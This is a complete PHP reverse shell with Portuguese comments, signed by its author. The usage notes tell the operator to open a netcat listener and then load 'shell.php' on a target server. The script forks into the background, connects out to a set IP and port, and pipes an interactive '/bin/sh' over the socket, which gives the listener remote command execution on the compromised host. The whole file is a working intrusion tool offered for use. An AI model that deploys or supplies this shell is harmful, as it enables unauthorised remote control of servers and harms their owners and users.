<?php

$ip = "127.0.0.1";  // coloque seu ip
$porta = 8888;

/*
  * Coded By: Dwirn1337
  * Twitter: @dwirn1337
  * Telegram: @dwirn1337
  * GitHub: github.com/dwirn1337
  * WhatsApp: +55 11 94380-9900
  *
  *
  * Atenção :
  * 1-> USAR EM REDE NAT !!!
  * 2-> APENAS EM SERVIDOR LINUX
  * 3-> APENAS EM MAQUINA LINUX
  *
  * Modo de uso:
  * 1-> Abra uma conexão com netcat
  * root@system:~# netcat -ll -p <porta>
  *
  * Com o "shell.php" no servidor alvo:
  * Execute o script
  * servidoralvo.com/shell.php
  *
  */


set_time_limit (0); // Define para o script não parar nunca
umask(0); // Define as permissões como padrão

$shell = "/bin/sh -i";	// SHELL da maquina
$write = null;
$except = null;
$tam = 1400;

if (function_exists('pcntl_fork')) {
   $p = pcntl_fork();

   if ($p == -1) {
      print "Erro: pcntl_fork()";
      exit(1);
   }

   if ($p) {
      print "Fork em execucao!";
      exit(0);
   }

   if (posix_setsid() == -1) {
      print "Erro: posix_setsid()!";
      exit(1);
   }
}

$socket = fsockopen($ip, $porta, $intErro, $strErro, 20);

if (!$socket) {
   print "Erro ao abrir conexao!";
   exit(1);
}

$array_pipes = array(
   0 => array("pipe", "r"),   // stdin   | read
   1 => array("pipe", "w"), // stdout | write
   2 => array("pipe", "w")  // stder   | write
);

$proc = proc_open($shell, $array_pipes, $pipes);

if (!is_resource($proc)) {
   print "Erro ao abrir processo!";
   exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($socket, 0);

print "Conexão realizada com sucesso!";

while (1) {
   if (feof($socket)) {
      break;
   }

   if (feof($pipes[1])) {
      break;
   }

   $read = array($socket, $pipes[1], $pipes[2]);

   stream_select($read, $write, $except, null);

   if (in_array($socket, $read)) {
      $entrada = fread($socket, $tam);
      fwrite($pipes[0], $entrada);
   }

   if (in_array($pipes[1], $read)) {
      $entrada = fread($pipes[1], $tam);
      fwrite($socket, $entrada);
   }

   if (in_array($pipes[2], $read)) {
      $entrada = fread($pipes[2], $tam);
      fwrite($socket, $entrada);
   }
}

fclose($socket);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);

proc_close($proc);

?>
